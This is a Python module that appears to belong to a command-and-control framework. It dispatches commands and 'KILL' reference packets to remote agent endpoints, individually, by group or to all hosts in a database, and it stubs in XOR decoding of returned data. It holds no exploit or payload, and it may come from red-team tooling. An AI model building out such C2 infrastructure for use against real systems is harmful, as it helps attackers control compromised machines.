from transport import packets
from termcolor import colored

def sendRefCMD(tsObj, destGroup, endpoint, refId):
    kill = False
    if refId == "KILL":
        kill = True

    if destGroup == "agent":
        if kill:
            tsObj.getDBObj().deadStatus(endpoint)

        print(colored(f"[*] Sending Reference \"{refId}\" ==> ({endpoint})\n", "magenta"))

        iPacket = packets.IDPacket(endpoint, refId)
        iPacket.sendIdPacket()
    
    elif destGroup == "all": #shutdown only
        data = tsObj.getDBObj().dbPull()
        if len(data) == 0:
            return 

        for entry in data:
            if kill:
                tsObj.getDBObj().deadStatus(entry[0])

            print(colored(f"[!] Sending Reference \"{refId}\" ==> ({entry[0]})\n", "magenta"))
            iPacket = packets.IDPacket(entry[0], refId)
            iPacket.sendIdPacket()

    else:
        data = tsObj.getDBObj().pullSpecific(destGroup, endpoint)
        for ip in data:
            if kill:
                tsObj.getDBObj().deadStatus(ip[0])

            print(colored(f"[*] Sending Reference \"{refId}\" ==> {ip[0]} ({endpoint})\n", "magenta"))

            iPacket = packets.IDPacket(ip[0], refId)
            iPacket.sendIdPacket()


def sendCMD(tsObj, cmd, destGroup, endpoint): 
    if destGroup == "agent": 
        print(colored(f"[*] Sending Command \"{cmd}\" ==> ({endpoint})\n", "magenta"))
        cPacket = packets.CommandPacket(endpoint, cmd)
        cPacket.sendCommandPacket()

    else:
        data = tsObj.getDBObj().pullSpecific(destGroup, endpoint)
        for ip in data:
            print(colored(f"[*] Sending Command \"{cmd}\" ==> {ip[0]} ({endpoint})\n", "magenta"))

            cPacket = packets.CommandPacket(ip[0], cmd)
            cPacket.sendCommandPacket()


def printOutput(datahold, ip):
    print("output", datahold, ip) #TODO actual output


def decode(data):
    #TODO xor single byte decode, return data
    strdata = data.decode('latin-1')

    return strdata